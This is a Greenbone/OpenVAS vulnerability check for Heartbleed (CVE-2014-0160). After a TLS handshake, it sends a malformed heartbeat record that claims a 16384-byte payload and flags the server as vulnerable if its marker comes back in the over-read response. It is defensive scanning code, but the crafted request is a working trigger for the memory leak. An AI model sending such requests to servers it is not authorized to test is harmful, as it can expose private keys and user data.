if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103936" );
	script_version( "2021-02-12T06:42:15+0000" );
	script_bugtraq_id( 66690 );
	script_cve_id( "CVE-2014-0160" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-02-12 06:42:15 +0000 (Fri, 12 Feb 2021)" );
	script_tag( name: "creation_date", value: "2014-04-09 09:54:09 +0200 (Wed, 09 Apr 2014)" );
	script_name( "SSL/TLS: OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "SSL and TLS" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_tls_version_get.sc" );
	script_mandatory_keys( "ssl_tls/port" );
	script_xref( name: "URL", value: "https://www.openssl.org/news/secadv/20140407.txt" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/66690" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to gain access to sensitive
  information that may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a special crafted TLS request and check the response." );
	script_tag( name: "insight", value: "The TLS and DTLS implementations do not properly handle
  Heartbeat Extension packets." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "OpenSSL is prone to an information disclosure vulnerability." );
	script_tag( name: "affected", value: "OpenSSL 1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, and
  1.0.1 are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("mysql.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
require("byte_func.inc.sc");
require("ssl_funcs.inc.sc");
func _broken_heartbeat( version, vtstring ){
	var version, vtstring;
	var hb, payload;
	if(!version){
		version = TLS_10;
	}
	payload = raw_string( 0x01 ) + raw_string( 16384 / 256, 16384 % 256 ) + crap( length: 16 ) + "------------------------->" + vtstring + "<-------------------------";
	hb = version + data_len( data: payload ) + payload;
	return hb;
}
func test_hb( port, version, vtstring ){
	var port, version, vtstring;
	var soc, hello, data, record, hello_done, v, hb, d;
	soc = open_ssl_socket( port: port );
	if(!soc){
		return FALSE;
	}
	hello = ssl_hello( port: port, version: version, extensions: make_list( "heartbeat" ) );
	if(!hello){
		close( soc );
		return FALSE;
	}
	send( socket: soc, data: hello );
	for(;!hello_done;){
		data = ssl_recv( socket: soc );
		if(!data){
			close( soc );
			return FALSE;
		}
		record = search_ssl_record( data: data, search: make_array( "handshake_typ", SSLv3_SERVER_HELLO ) );
		if(record){
			if(record["extension_heartbeat_mode"] != 1){
				close( soc );
				return;
			}
		}
		record = search_ssl_record( data: data, search: make_array( "handshake_typ", SSLv3_SERVER_HELLO_DONE ) );
		if(record){
			hello_done = TRUE;
			v = record["version"];
			break;
		}
	}
	if(!hello_done){
		close( soc );
		return FALSE;
	}
	hb = _broken_heartbeat( version: version, vtstring: vtstring );
	send( socket: soc, data: raw_string( 0x18 ) );
	send( socket: soc, data: hb );
	d = ssl_recv( socket: soc );
	if(strlen( d ) > 3 && ContainsString( d, NASLString( "->", vtstring, "<-" ) )){
		security_message( port: port );
		exit( 0 );
	}
	if(soc){
		close( soc );
	}
	return;
}
if(!port = tls_ssl_get_port()){
	exit( 0 );
}
if(!versions = get_supported_tls_versions( port: port, min: SSL_v3, max: TLS_12 )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for version in versions {
	test_hb( port: port, version: version, vtstring: vt_strings["default"] );
}
exit( 99 );

